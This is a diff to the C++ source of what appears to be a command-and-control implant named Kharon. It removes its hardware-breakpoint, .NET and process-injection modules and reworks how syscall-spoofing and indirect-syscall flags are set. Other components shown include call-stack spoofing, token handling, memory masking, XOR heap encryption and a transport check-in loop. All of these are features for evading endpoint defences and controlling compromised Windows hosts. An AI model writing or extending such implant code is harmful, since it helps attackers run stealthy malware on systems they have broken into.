@@ -10,12 +10,10 @@ EXTERN_C DECLFN auto Main(
     Crypt     KhCrypt( &Kh );
     Spoof     KhSpoof( &Kh );
     Coff      KhCoff( &Kh );
-    HwbpEng   KhHwbp( &Kh );
     Syscall   KhSyscall( &Kh );
     Socket    KhSocket( &Kh );
     Jobs      KhJobs( &Kh );
     Useful    KhUseful( &Kh );
-    Dotnet    KhDotnet( &Kh );
     Library   KhLibrary( &Kh );
     Token     KhToken( &Kh );
     Heap      KhHeap( &Kh );
@@ -26,23 +24,19 @@ EXTERN_C DECLFN auto Main(
     Transport KhTransport( &Kh );
     Package   KhPackage( &Kh );
     Parser    KhParser( &Kh );
-    Injection KhInjection( &Kh );
     Mask      KhMask( &Kh );
 
     Kh.InitCrypt( &KhCrypt );
     Kh.InitSpoof( &KhSpoof );
     Kh.InitCoff( &KhCoff );
     Kh.InitMemory( &KhMemory );
-    Kh.InitHwbp( &KhHwbp );
     Kh.InitSyscall( &KhSyscall );
     Kh.InitSocket( &KhSocket );
     Kh.InitJobs( &KhJobs );
     Kh.InitUseful( &KhUseful );
-    Kh.InitDotnet( &KhDotnet );
     Kh.InitHeap( &KhHeap );
     Kh.InitLibrary( &KhLibrary );
     Kh.InitToken( &KhToken );
-    Kh.InitInjection( &KhInjection );
     Kh.InitMask( &KhMask );
     Kh.InitProcess( &KhProcess );
     Kh.InitTask( &KhTask );
@@ -165,10 +159,7 @@ auto DECLFN Kharon::Init(
     }
 
     /* ========= [ set syscall flags ] ========= */
-    this->KH_SYSCALL_FLAGS = 0;
-
-    if ( this->Spf->Enabled ) this->KH_SYSCALL_FLAGS |= SYSCALL_SPOOF;
-    if ( this->Sys->Enabled ) this->KH_SYSCALL_FLAGS |= SYSCALL_INDIRECT;
+    KhDbgz( "flags: %X", SYSCALL_FLAGS );
 
     /* ========= [ key generation to xor heap and package ] ========= */
     for ( INT i = 0; i < sizeof( this->Crp->XorKey ); i++ ) {
@@ -318,7 +309,6 @@ auto DECLFN Kharon::Start(
     //
     // do checkin routine (request + validate connection)
     //
-
     this->Tsp->Checkin();
 
     do {            
